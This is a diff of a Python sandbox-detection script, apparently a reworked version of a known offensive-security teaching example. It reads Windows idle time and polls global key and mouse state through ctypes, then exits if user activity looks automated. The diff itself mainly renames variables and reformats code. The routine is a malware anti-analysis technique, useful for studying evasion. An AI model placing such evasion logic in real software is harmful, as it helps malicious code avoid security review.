@@ -16,85 +16,85 @@ mouse_clicks=0
 double_clicks=0
 
 class LASTINPUTINFO(ctypes.Structure):
-	_fields_=[("cbSize",ctypes.c_uint),("dwTime",ctypes.c_ulong)]
+	_fields_ = [("cbSize",ctypes.c_uint),("dwTime",ctypes.c_ulong)]
 
-def get_last_input():
-	struct_lastinputinfo=LASTINPUTINFO()
-	struct_lastinputinfo.cbSize=ctypes.sizeof(LASTINPUTINFO)
+def recent_input():
+	struct_lastinputinfo = LASTINPUTINFO()
+	struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)
 	user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))
-	run_time=kernel32.GetTickCount()
+	run_time = kernel32.GetTickCount()
 
-	elapsed=run_time - struct_lastinputinfo.dwTime
+	elapsed_time = run_time - struct_lastinputinfo.dwTime
 
-	print("[*]Time elapsed since last event(in ms):".format(elapsed))
+	print("[*]Time elapsed_time since last event(in ms):{0}".format(elapsed_time))
 
-	return elapsed
+	return elapsed_time
 
-def get_key_press():
+def press_key():
 	global mouse_clicks
 	global keystrokes
 
 	for i in range(0,0xff):
 		if user32.GetAsyncKeyState(i) == -32767:
 			#left mouse
-			if i==0x1:
-				mouse_clicks+=1
+			if i == 0x1:
+				mouse_clicks += 1
 				return time.time()
-			elif i>32 and i<127:
-				keystrokes+=1
+			elif i > 32 and i < 127:
+				keystrokes += 1
 
 	return None
 
-def detect_sandbox():
+def sandbox_detection():
 	global  mouse_clicks
 	global  keystrokes
 
-	max_keystrokes=random.randint(10,25)
-	max_mouse_clicks=random.randint(5,25)
+	max_keystrokes = random.randint(10,25)
+	max_mouse_clicks = random.randint(5,25)
 
-	double_clicks=0
-	max_double_clicks=10
-	double_click_threshold=0.250 #seconds
-	first_double_click=None
+	double_clicks = 0
+	dc_max = 10 #maximum number of double clicks
+	dc_threshold = 0.250 #seconds, threshold for double clicks
+	dc_first = None #for timestamp of first click of the "dc"
 
-	average_mousetime=0
-	max_input_threshold=30000 #milli-seconds
+	avg_use_mouse=0
+	max_input_threshold=30000 #in milli-seconds
 
 	previous_timestamp=None
-	detection_complete=False
+	detection_status=False
 
-	last_input=get_last_input()
+	last_input = recent_input()
 
 	#threshold limit
-	if last_input>=max_input_threshold:
+	if last_input >= max_input_threshold:
 		sys.exit(0)
 
-	while not detection_complete:
-		keypress_time=get_key_press()
+	while not detection_status:
+		time_keypress=press_key()
 
-		if keypress_time is not None and previous_timestamp is not None:
+		if time_keypress is not None and previous_timestamp is not None:
 			#time btw double click
-			elapsed=keypress_time - previous_timestamp
+			elapsed_time=time_keypress - previous_timestamp
 
 			#double-click
-			if elapsed<= double_click_threshold:
-				double_clicks+=1
+			if elapsed_time <= dc_threshold:
+				double_clicks += 1
 
-				if first_double_click is None:
+				if dc_first is None:
 					#first click time-stamp
-					first_double_click=time.time()
+					dc_first = time.time()
 
 				else:
-					if double_clicks == max_double_clicks:
-						if keypress_time - first_double_click <= (max_double_clicks * double_click_threshold):
+					if double_clicks == dc_max:
+						if time_keypress - dc_first <= (dc_max * dc_threshold):
 							sys.exit(0)
 			#limit
-			if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
+			if keystrokes >= max_keystrokes and double_clicks >= dc_max and mouse_clicks >= max_mouse_clicks:
 				return
 			
-			previous_timestamp=keypress_time
-		elif keypress_time is not None:
-			previous_timestamp = keypress_time
+			previous_timestamp=time_keypress
+		elif time_keypress is not None:
+			previous_timestamp = time_keypress
 
-detect_sandbox()
+sandbox_detection()
 print("No problems till now!")
